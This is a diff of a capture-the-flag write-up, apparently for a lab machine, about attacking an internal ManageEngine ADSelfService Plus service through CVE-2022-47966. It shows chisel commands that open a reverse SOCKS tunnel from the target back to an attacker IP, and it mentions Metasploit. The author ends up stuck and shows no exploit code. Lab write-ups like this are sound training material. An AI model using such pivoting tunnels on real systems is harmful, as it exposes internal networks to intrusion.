@@ -124,20 +124,25 @@ Checking `Program Files (x86)` I got `ManageEngine\ADSelfService Plus`
 Searching for exploit leads here [Resource](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)
 
 I'll port forward again using chisel in order to exploit the service running internally
-![image](https://user-images.githubusercontent.com/127159644/227750304-c7085dd0-fe09-40fd-8e04-2deb54df0ecf.png)
-
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/19f54578-066a-4a1e-bb04-3fd856b7eb1b)
 ```
-# Attacker
-chisel server -p 9090 --reverse
-
-# Target
-.\chisel-x64.exe client 10.10.14.175:9090 R:9091:socks
+Attacker: chisel server -p 8080
+Target: .\chisel.exe client 10.10.14.175:8080 R:9000:socks
 ```
 
-Since we need some requirements before exploiting the service lets get em
+Since the service runs on port 9251 I port forwarded it to my host
 
-But i kept on getting 500 Intenal Error i don't know why
-![image](https://user-images.githubusercontent.com/127159644/227751588-411284ee-f9bb-41da-a054-6a5911770e7c.png)
+From scanning my host I can tell that it indeed runs on port 9251
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/76525791-733e-4d6c-92c0-4cd562d6d6b2)
 
-I'll stop here because ive been resetting and it doesn't still work 🤔
+Back to exploitation
 
+Loading up metasploit shows the it requires some values
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9efec2b-27e1-4066-9eec-52bc1f5a49c0)
+
+Moving over to the web service shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aeec12c6-618c-4266-b966-f9a7bd55fc90)
+
+Since it's trying to resolve to that let's add it to our `/etc/hosts` file `dc.cerberus.local`
+
+It wasn't able to resolve so i was stucked here too bad 😞
